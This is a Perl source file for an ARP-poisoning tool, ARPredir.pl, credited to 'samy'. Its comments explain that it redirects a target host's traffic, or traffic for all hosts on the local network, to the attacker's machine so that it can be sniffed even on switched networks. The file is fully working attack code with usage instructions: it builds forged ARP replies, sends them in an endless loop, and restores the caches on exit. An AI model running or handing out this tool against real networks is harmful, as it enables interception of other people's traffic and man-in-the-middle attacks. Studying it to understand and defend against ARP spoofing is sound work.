#!/usr/bin/perl

# ARPredir.pl - by samy [CommPort5@LucidX.com]
# requires Packet (by samy and David Hulton)

# this will arp poisen a host (all hosts by default) on a local network
# and will allow you to sniff a specific host on your network without
# even enabling promiscuous mode on your ethernet device, and this will
# even work if the network is switched (that's the main purpose)

# offset is usually 78 or 80 for openbsd and 94 for freebsd

# usage: ./arpredir.pl [-t target] [-i device] offset host

use Packet::Device;			# module for getting local net interface and network info
use Packet::Lookups;			# module for converting values
use Packet::Inject;			# module for creating and sending packets
use Packet::Inject::ARP;		# module for creating an ARP header
use Packet::Inject::Ethernet;		# module for creating an ethernet header

$SIG{INT} = \&exit;			# when exiting go to &exit to fix the arp cache tables
my ($off, $host, $dev, $targ) = &begin;	# get arguements
unless ($targ) {			# target not specified
 $targ = "255.255.255.255";		# target will default to broadcast
 $arp{tpa} = "00000000";
}
else {
 $arp{tpa} = $targ;
}
unless ($dev) {				# no device specified
 $dev = if_dev();			# figure out main network device
}
$eth{src} = dev2mac($dev);		# always your local mac
$eth{dst} = ip2mac($off, $targ);	# always the target ip's mac [broadcast unless def'd with -t]
$arp{tha} = $eth{dst};			# always the target ip's mac [broadcast unless def'd with -t]
$arp{sha} = $eth{src};			# the mac that should receieve the data [at first, yours]
$arp{spa} = $host;			# the ip that should be assigned to your mac [def'd by <host>]
$arp{dmc} = ip2mac($off, $host);	# the original mac address of the ip
$pkt = new Packet::Inject(		# create a new packet object
 ETHERNET => {				# Ethernet header
  dest_mac => "ff:ff:ff:ff:ff:ff",	# dest mac
  src_mac => $eth{src},			# sourc mac
 },
 ARP => {				# ARP header
  opcode => 1,				# ARP who-has
  tha => "00:00:00:00:00:00",		# dest mac (repeated)
  sha => $arp{sha},			# source mac (repeated)
  spa => if_addr($dev),			# your real ip
  tpa => $arp{spa},			# the host's ip
 }
);
unless ($eth{dst}) {			# target wasn't in the arp cache table
 $pkt->send(1, $dev);			# send the packet once
}
unless ($arp{dmc}) {			# host wasn't in the arp cache table
 $pkt->send(1, $dev);			# send the packet once
}
if (!$eth{dst} or !$arp{dmc}) {		# one, or even both, of the macs weren't found
 $eth{dst} = ip2mac($off, $targ);	# retrieve proper mac
 $arp{dmc} = ip2mac($off, $host);	# get new host mac
 $arp{tha} = $eth{dst};			# reset the value to what it should be
}
$pkt->{ETHERNET}{dest_mac} = $eth{dst};	# change dest mac to new dest mac
$pkt->{ARP}{opcode} = 2;		# ARP is-at
$pkt->{ARP}{tha} = $arp{tha};		# dest mac (repeated)
$pkt->{ARP}{spa} = $arp{spa};		# the ip that our mac address is pretending to be
$pkt->{ARP}{tpa} = $arp{tpa};		# the ip that should get the arps

while (1) {				# infinite loop until SIGINT is called
 $pkt->send(1, $dev);			# send packet
 print "$arp{sha} $arp{tha} 0806 42: arp reply $arp{spa} is-at $arp{sha}\n";
 sleep 2;				# wait 2 seconds
}

sub exit {				# SIGINT has been called
 $SIG{INT} = sub { };			# make sure SIGINT doesn't do anything anymore
 $pkt->{ARP}{sha} = $arp{dmc};		# reroute the ip to the correct mac address
 foreach (1 .. 2) {			# loop twice for 2 packets
  $pkt->send(1, $dev);			# send packet
  print "$arp{dmc} $arp{tha} 0806 42: arp reply $arp{spa} is-at $arp{dmc}\n";
  sleep 1;				# wait a second
 }
 $pkt->send(1, $dev);			# send another (and last) packet and die
 die "$arp{dmc} $arp{tha} 0806 42: arp reply $arp{spa} is-at $arp{dmc}\n";
}

sub error {
 print "offsets:\n\topenbsd: 78 or 80\n\tfreebsd: 94\n\tlinux: unknown to the human race for all it's worth\n";
 die "usage: $0 [-t target] [-i device] offset host\n";	# incorrect arguements called
}

sub begin {
 if (@ARGV < 1 or @ARGV > 5) {
  &error;
 }
 my $host = pop(@ARGV);
 my $off = pop(@ARGV);
 my ($dev, $targ);
 for ($i = 0; $i < @ARGV; $i++) {
  if ($ARGV[$i] =~ /^[^-]/ and $ARGV[$i-1] =~ /^[^-]/) {
   &error;
  }
  if ($ARGV[$i] =~ /^-/) {
   if ($ARGV[$i] =~ /^-([a-z]+)$/i) {
    if ($1 eq 'i') {
     $dev = $ARGV[$i+1];
    }
    elsif ($1 eq 't') {
     $targ = $ARGV[$i+1];
    }
   }
   else {
    &error;
   }
  }
 }
 return($off, $host, $dev, $targ);
}
